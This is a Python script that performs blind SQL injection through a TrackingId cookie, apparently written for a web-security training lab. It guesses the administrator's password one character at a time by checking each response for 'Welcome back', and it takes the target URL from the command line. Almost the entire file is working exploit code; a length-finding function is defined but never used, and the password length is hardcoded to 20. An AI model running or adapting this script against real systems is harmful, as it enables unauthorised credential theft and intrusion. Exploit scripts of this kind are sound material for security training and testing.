import requests
import sys
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
TrackingId = "Q1Yzb7wV2AzAByop"
def getPasswordLength(url):
     current_length =0
     print("Calculating the password length: ")
     while True:  
        print('.', end=" ", flush=True)
        cookies = {'TrackingId': f"{TrackingId}' and ((SELECT username FROM users WHERE username='administrator' and LENGTH(password) = {current_length})='administrator') --"}
        try:
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome back" in r.text:
                    
                    return current_length
            if current_length > 100:
                print("Can't Calculate password length, verify your cookies")
                sys.exit(-1)
            current_length = current_length+1
        except:
             print("Connection Problem")
             sys.exit(-1)
             
        
        
  
def getPassword(url):
    passworLength = 20
    print("\nPassword Length is "+ str(passworLength))
    print("Cracking the password ... ")
    gessed_password =""
    for i in range(1, passworLength+1):
        for j in range(32, 127):
            paylod = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{chr(j)}'-- "
            cookies = {'TrackingId': TrackingId+paylod}
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome back" not in r.text:
                print('\r'+gessed_password+chr(j),end="", flush=True)
            else:
                gessed_password+=chr(j)
     
    return gessed_password
     
    

try:
    url = sys.argv[1]
   
except IndexError:
        print(f"[usage]: python {sys.argv[0]} <url>")
        print(f"[example]: python {sys.argv[0]} www.example.com")
        sys.exit(-1)
os.system('cls' if os.name == 'nt' else 'clear')
print( "Password is :\n" +getPassword(url))